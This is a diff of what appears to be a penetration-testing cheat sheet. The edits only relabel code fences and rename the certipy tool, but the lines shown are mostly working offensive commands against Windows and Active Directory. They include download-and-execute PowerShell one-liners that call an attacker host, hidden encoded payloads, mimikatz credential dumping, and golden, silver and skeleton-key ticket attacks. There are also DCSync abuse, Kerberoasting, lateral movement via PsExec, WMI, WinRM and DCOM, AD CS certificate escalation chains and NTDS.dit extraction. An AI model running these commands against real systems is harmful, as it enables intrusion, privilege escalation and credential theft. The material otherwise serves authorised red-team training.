@@ -536,7 +536,7 @@ curl${IFS}<LHOST>/<FILE>                                                       /
 
 ##### Certutil
 
-```console
+```cmd
 certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ```
 
@@ -557,7 +557,7 @@ copy * \\<LHOST>\<SHARE>
 
 ##### PowerShell
 
-```console
+```cmd
 iwr <LHOST>/<FILE> -o <FILE>
 IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
 powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
@@ -793,7 +793,7 @@ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 
 ##### dir
 
-```console
+```cmd
 dir /a
 dir /a:d
 dir /a:h
@@ -1148,7 +1148,7 @@ find / -name plink.exe 2>/dev/null
 
 ###### WINDOWS JUMP SERVER
 
-```console
+```cmd
 plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
 ```
 
@@ -1179,7 +1179,7 @@ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
 
 ###### WINDOWS JUMP SERVER
 
-```console
+```cmd
 netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
 netstat -anp TCP | findstr "2222"
 netsh interface portproxy show all
@@ -1195,7 +1195,7 @@ ssh database_admin@192.168.50.10 -p2222
 
 ###### WINDOWS JUMP SERVER
 
-```console
+```cmd
 netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
 ```
@@ -1436,7 +1436,7 @@ virtualenv -p python2.7 venv
 . venv/bin/activate
 ```
 
-```console
+```cmd
 python.exe -m pip install virtualenv
 python.exe -m virtualenv venv
 venv\Scripts\activate
@@ -3257,7 +3257,7 @@ john --show <FILE>
 
 #### LaZagne
 
-```console
+```cmd
 laZagne.exe all
 ```
 
@@ -3265,7 +3265,7 @@ laZagne.exe all
 
 ##### Common Commands
 
-```console
+```cmd
 token::elevate
 token::revert
 vault::cred
@@ -3278,7 +3278,7 @@ lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
 
 ##### Dump Hashes
 
-```console
+```cmd
 .\mimikatz.exe
 sekurlsa::minidump /users/admin/Desktop/lsass.DMP
 sekurlsa::LogonPasswords
@@ -3289,7 +3289,7 @@ meterpreter > golden_ticket_create
 
 ##### Pass the Ticket
 
-```console
+```cmd
 .\mimikatz.exe
 sekurlsa::tickets /export
 kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
@@ -3299,7 +3299,7 @@ dir \\<RHOST>\admin$
 
 ##### Forging Golden Ticket
 
-```console
+```cmd
 .\mimikatz.exe
 privilege::debug
 lsadump::lsa /inject /name:krbtgt
@@ -3311,7 +3311,7 @@ dir \\<RHOST>\admin$
 
 ##### Skeleton Key
 
-```console
+```cmd
 privilege::debug
 misc::skeleton
 net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
@@ -3823,7 +3823,7 @@ BruteForce $duration $threshold $passwords
 
 ##### Usage
 
-```console
+```cmd
 .\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
 ```
 
@@ -3975,7 +3975,7 @@ LPORT => <LPORT>
 msf6 exploit(multi/handler) > run
 ```
 
-```console
+```cmd
 .\<FILE>.exe
 ```
 
@@ -3989,21 +3989,21 @@ meterpreter > download *
 
 ##### Add User
 
-```console
+```cmd
 net user <USERNAME> <PASSWORD> /add /domain
 net group "Exchange Windows Permissions" /add <USERNAME>
 ```
 
 ##### Import PowerView
 
-```console
+```cmd
 powershell -ep bypass
 . .\PowerView.ps1
 ```
 
 ##### Add DCSync Rights
 
-```console
+```cmd
 $pass = convertto-securestring '<PASSWORD>' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
 Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" -PrincipalIdentity <USERNAME> -Rights DCSync
@@ -4019,7 +4019,7 @@ impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
 
 ##### Manual Enumeration
 
-```console
+```cmd
 net user /domain
 net user <USERNAME> /domain
 net group /domain
@@ -4035,7 +4035,7 @@ Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
 
 ##### Enumeration using PowerView
 
-```console
+```cmd
 powershell -ep bypass
 . .\PowerUp.ps1
 Get-NetDomain
@@ -4049,7 +4049,7 @@ Convert-SidToName S-1-5-21-1987370373-658406905-1781884369-1104
 
 ##### Service Principal Name (SPN) Enumeration
 
-```console
+```cmd
 setspn -L iis_service
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 nslookup.exe <RHOST>
@@ -4067,7 +4067,7 @@ nslookup.exe <RHOST>
 | ForceChangePassword | Password change for object |
 | Self (Self-Membership) | Add ourselves to for example a group |
 
-```console
+```cmd
 Get-ObjectAcl -Identity <USERNAME>
 Get-ObjectAcl -Identity "<GROUP>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
 Get-NetGroup "<GROUP>" | select member
@@ -4077,7 +4077,7 @@ net group "<GROUP>" <USERNAME> /del /domain
 
 ##### Share Enumeration
 
-```console
+```cmd
 Find-DomainShare
 ls \\<RHOST>\sysvol\<DOMAIN>\
 ls \\<RHOST>\sysvol\<DOMAIN>\Policies\
@@ -4089,7 +4089,7 @@ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vgepPfsN1zMFTiQuyApgR92JE"
 
 ###### Cached Credentials
 
-```console
+```cmd
 .\mimikatz.exe
 mimikatz # sekurlsa::logonpasswords
 dir \\<RHOST>\<SHARE>
@@ -4103,7 +4103,7 @@ impacket-GetNPUsers -dc-ip <RHOST> -request -outputfile hashes.asreproast <DOMAI
 hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-```console
+```cmd
 .\Rubeus.exe asreproast /nowrap
 hashcat -m 18200 hashes.asreproast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
 ```
@@ -4115,7 +4115,7 @@ impacket-GetUserSPNs -dc-ip <RHOST> -request <DOMAIN>/<USERNAME>
 hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-```console
+```cmd
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 hashcat -m 13100 hashes.kerberoast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
 ```
@@ -4130,7 +4130,7 @@ hashcat -m 13100 hashes.kerberoast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/h
 
 ###### Silver Ticket Forgery
 
-```console
+```cmd
 iwr -UseDefaultCredentials http://<RHOST>
 .\mimikatz.exe
 mimikatz # privilege::debug
@@ -4151,8 +4151,8 @@ iwr -UseDefaultCredentials http://<RHOST>
 
 ###### Domain Controller Synchonization Execution
 
-```console
-PS C:\> .\mimikatz.exe
+```cmd
+.\mimikatz.exe
 mimikatz # lsadump::dcsync /user:<DOMAIN>\<USERNAME>
 mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator
 hashcat -m 1000 <FILE> /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
@@ -4168,13 +4168,13 @@ impacket-secretsdump -just-dc-user <USERNAME> <DOMAIN>/<USERNAME>:"<PASSWORD>"@<
 
 ###### Spawning Process
 
-```console
+```cmd
 wmic /node:<RHOST> /user:<USERNAME> /password:<PASSWORD> process call create "cmd"
 ```
 
 ###### Store Credentials
 
-```console
+```cmd
 $username = '<USERNAME>';
 $password = '<PASSWORD>';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
@@ -4183,7 +4183,7 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 
 ###### Instanciate Distributed Component Object MOdel (DCOM)
 
-```console
+```cmd
 $options = New-CimSessionOption -Protocol DCOM
 $session = New-Cimsession -ComputerName <RHOST> -Credential $credential -SessionOption $Options 
 $command = 'cmd';
@@ -4211,13 +4211,13 @@ print(cmd)
 python3 encode.py
 ```
 
-```console
+```cmd
 powershell -nop -w hidden -e JAB<--- SNIP --->CkA
 ```
 
 ###### Execution
 
-```console
+```cmd
 $username = '<USERNAME>';
 $password = '<PASSWORD>';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
@@ -4236,14 +4236,14 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 
 ###### Execution
 
-```console
+```cmd
 winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
 winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "powershell -nop -w hidden -e JAB<--- SNIP --->CkA"
 ```
 
 ###### PowerShell
 
-```console
+```cmd
 $username = '<USERNAME>';
 $password = '<PASSWORD>';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
@@ -4254,7 +4254,7 @@ Enter-PSSession 1
 
 ###### PsExec
 
-```console
+```cmd
 .\PsExec64.exe -i \\<RHOST> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
 ```
 
@@ -4266,7 +4266,7 @@ impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
 
 ###### Overpass the Hash
 
-```console
+```cmd
 .\mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
@@ -4285,7 +4285,7 @@ klist
 
 ###### Exporting the Ticket
 
-```console
+```cmd
 .\mimikatz.exe
 mimikatz # privilege::debug
 mimikatz #sekurlsa::tickets /export
@@ -4303,7 +4303,7 @@ klist
 
 ###### Creating and storing the Distributed Component Object Model
 
-```console
+```cmd
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<RHOST>"))
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c cmd","7")
 tasklist | findstr "cmd"
@@ -4320,7 +4320,7 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -no
 
 ###### Forge and Inject Golden Ticket
 
-```console
+```cmd
 .\mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # lsadump::lsa /patch
@@ -4333,7 +4333,7 @@ mimikatz # misc::cmd
 
 Use the `hostname` and not the `IP address` because otherwise it would authenticate via `NTLM` and the access would still be blocked.
 
-```console
+```cmd
 .\PsExec.exe \\<RHOST> cmd
 ```
 
@@ -4343,7 +4343,7 @@ Use the `hostname` and not the `IP address` because otherwise it would authentic
 
 ###### Create and collect necessary Files
 
-```console
+```cmd
 vshadow.exe -nw -p  C:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
 reg.exe save hklm\system C:\system.bak
@@ -4353,66 +4353,66 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 #### Active Directory Certificate Services (AD CS)
 
 ```console
-certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout
+certipy-ad find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout
 ```
 
 ##### ESC1: Misconfigured Certificate Templates
 
 ```console
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
-certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
+certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC2: Misconfigured Certificate Templates
 
 ```console
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
-certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
+certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
+certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC3: Enrollment Agent Templates
 
 ```console
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
-certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
+certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
+certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC4: Vulnerable Certificate Template Access Control
 
 ```console
-certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <RHOST> -template <TEMPLATE> -upn administrator@<DOMAIN>
-certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
+certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <RHOST> -template <TEMPLATE> -upn administrator@<DOMAIN>
+certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
 or
 
 ```console
-certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
-certipy req -ca '<CA>' -dc-ip <RHOST> -u <USERNAME> -p '<PASSWORD>' -template <TEMPLATE> -target <RHOST> -upn administrator@<DOMAIN> -debug
-certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
+certipy-ad req -ca '<CA>' -dc-ip <RHOST> -u <USERNAME> -p '<PASSWORD>' -template <TEMPLATE> -target <RHOST> -upn administrator@<DOMAIN> -debug
+certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
 
 ```console
-certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip <RHOST> -stdout
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
-certipy req -ca '<CA>' -username administrator@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
-certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip <RHOST> -stdout
+certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
+certipy-ad req -ca '<CA>' -username administrator@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
+certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC7: Vulnerable Certificate Authority Access Control
 
 ```console
-certipy ca -ca '<CA>' -add-officer <USERNAME> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
-certipy ca -ca '<CA>' -enable-template SubCA -username <USERNAME>@<DOMAIN> -password <PASSWORD>
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template SubCA -upn administrator@<DOMAIN>
-certipy ca -ca '<CA>' -issue-request <ID> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -retrieve <ID>
-certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad ca -ca '<CA>' -add-officer <USERNAME> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
+certipy-ad ca -ca '<CA>' -enable-template SubCA -username <USERNAME>@<DOMAIN> -password <PASSWORD>
+certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template SubCA -upn administrator@<DOMAIN>
+certipy-ad ca -ca '<CA>' -issue-request <ID> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
+certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -retrieve <ID>
+certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC8: NTLM Relay to AD CS HTTP Endpoints
@@ -4439,21 +4439,21 @@ impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
 ##### ESC9: No Security Extensions
 
 ```console
-certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
-certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
-certipy req -ca '<CA>' -username <USERNAME> -hashes 54296a48cd30259cc88095373cec24da -template <TEMPLATE>
-certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
-certipy auth -pfx administrator.pfx -domain <DOMAIN>
+certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
+certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
+certipy-ad req -ca '<CA>' -username <USERNAME> -hashes 54296a48cd30259cc88095373cec24da -template <TEMPLATE>
+certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
+certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
 ```
 
 or
 
 ```console
-certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
-certipy account update -username <USERNAME>@<DOMAIN> -hashes <HASH> -user <USERNAME> -upn Administrator
-certipy req -ca '<CA>' -username <USERNAME> -password '<PASSWORD>' -template <TEMPLATE>
-certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
-certipy auth -pfx administrator.pfx -domain <DOMAIN>
+certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
+certipy-ad account update -username <USERNAME>@<DOMAIN> -hashes <HASH> -user <USERNAME> -upn Administrator
+certipy-ad req -ca '<CA>' -username <USERNAME> -password '<PASSWORD>' -template <TEMPLATE>
+certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
+certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
 ```
 
 ##### ESC10: Weak Certificate Mappings
@@ -4461,33 +4461,33 @@ certipy auth -pfx administrator.pfx -domain <DOMAIN>
 ###### Case 1
 
 ```console
-certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
-certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
-certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -hashes a87f3a337d73085c45f9416be5787d86
-certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
-certipy auth -pfx administrator.pfx -domain <DOMAIN>
+certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
+certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
+certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -hashes a87f3a337d73085c45f9416be5787d86
+certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
+certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
 ```
 
 ###### Case 2
 
 ```console
-certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
-certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn 'DC$@<DOMAIN>'
-certipy req -ca 'CA' -username <USERNAME>@<DOMAIN> -password -hashes a87f3a337d73085c45f9416be5787d86
-certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
-certipy auth -pfx dc.pfx -dc-ip <RHOST> -ldap-shell
+certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
+certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn 'DC$@<DOMAIN>'
+certipy-ad req -ca 'CA' -username <USERNAME>@<DOMAIN> -password -hashes a87f3a337d73085c45f9416be5787d86
+certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
+certipy-ad auth -pfx dc.pfx -dc-ip <RHOST> -ldap-shell
 ```
 
 ##### ESC11: IF_ENFORCEENCRYPTICERTREQUEST
 
 ```console
-certipy relay -target 'rpc://<CA>' -ca 'CA'
-certipy auth -pfx administrator.pfx -domain <DOMAIN>
+certipy-ad relay -target 'rpc://<CA>' -ca 'CA'
+certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
 ```
 
 #### ADCSTemplate
 
-```console
+```cmd
 Import-Module .\ADCSTemplate.psm1
 New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
 ```
@@ -4582,7 +4582,7 @@ bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac <USERNAME> -f 
 
 > https://github.com/GhostPack/Certify
 
-```console
+```cmd
 Certify.exe find /vulnerable
 Certify.exe find /vulnerable /currentuser
 ```
@@ -4594,14 +4594,14 @@ Certify.exe find /vulnerable /currentuser
 > https://github.com/ly4k/BloodHound/
 
 ```console
-certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
-certipy find -dc-ip <RHOST> -u <USERNAME> -p <PASSWORD> -vulnerable -stdout
+certipy-ad find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
+certipy-ad find -dc-ip <RHOST> -u <USERNAME> -p <PASSWORD> -vulnerable -stdout
 ```
 
 ##### Account Creation
 
 ```console
-certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <RHOST> -user <COMPUTERNAME>
+certipy-ad account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <RHOST> -user <COMPUTERNAME>
 ```
 
 ##### Authentication
@@ -4613,7 +4613,7 @@ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN>
 ###### LDAP-Shell
 
 ```console
-certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap-shell
+certipy-ad auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap-shell
 ```
 
 ```console
@@ -4624,7 +4624,7 @@ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap
 ##### Certificate Forging
 
 ```console
-certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
+certipy-ad template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
 ```
 
 ##### Certificate Request
@@ -4632,18 +4632,18 @@ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template We
 Run the following command twice because of a current issue with `certipy`.
 
 ```console
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
+certipy-ad req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
 ```
 
 ```console
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN>
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN> -debug
+certipy-ad req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN>
+certipy-ad req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN> -debug
 ```
 
 ##### Revert Changes
 
 ```console
-certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLATE> -dc-ip <RHOST> -configuration <TEMPLATE>.json
+certipy-ad template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLATE> -dc-ip <RHOST> -configuration <TEMPLATE>.json
 ```
 
 ##### Start BloodHound Fork
@@ -4753,7 +4753,7 @@ impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
 impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JABjAGwAaQBlAG4AdA<--- CUT FOR BREVITY --->"
 ```
 
-```console
+```cmd
 dir \\<LHOST>\foobar
 ```
 
@@ -4902,7 +4902,7 @@ sudo python3 setup.py install
 
 #### JAWS
 
-```console
+```cmd
 IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
 ```
 
@@ -4924,13 +4924,13 @@ IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.p
 
 ###### With List of Users
 
-```console
+```cmd
 .\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
 ```
 
 ###### Check Passwords for all Users in Domain
 
-```console
+```cmd
 .\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
 ```
 
@@ -4952,13 +4952,13 @@ impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
 
 ###### Check ASPREPRoast for all Domain Users in Domain
 
-```console
+```cmd
 .\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
 ```
 
 ##### Kerberoasting
 
-```console
+```cmd
 impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
 .\Rubeus.exe kerberoast /outfile:<FILE>
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
@@ -5002,13 +5002,13 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 
 ###### Ask and inject the Ticket
 
-```console
+```cmd
 .\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
 ```
 
 ###### Execute a CMD on Remote Host
 
-```console
+```cmd
 .\PsExec.exe -accepteula \\<RHOST> cmd
 ```
 
@@ -5035,14 +5035,14 @@ cp tickey /tmp/tickey
 
 ###### Harvest Tickets from Windows
 
-```console
+```cmd
 sekurlsa::tickets /export
 .\Rubeus dump
 ```
 
 ###### Convert Tickets dumped with Rubeus into base64
 
-```console
+```cmd
 [IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
 ```
 
@@ -5073,19 +5073,19 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 
 ###### Inject Ticket with mimikatz
 
-```console
+```cmd
 kerberos::ptt <KIRBI_FILE>
 ```
 
 ###### Inject Ticket with Rubeus
 
-```console
+```cmd
 .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
 ```
 
 ###### Execute a CMD on Remote Host
 
-```console
+```cmd
 .\PsExec.exe -accepteula \\<RHOST> cmd
 ```
 
@@ -5123,37 +5123,37 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 
 ###### Generate TGS with NTLM
 
-```console
+```cmd
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
 ```
 
 ###### Generate TGS with AES 128bit Key
 
-```console
+```cmd
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
 ```
 
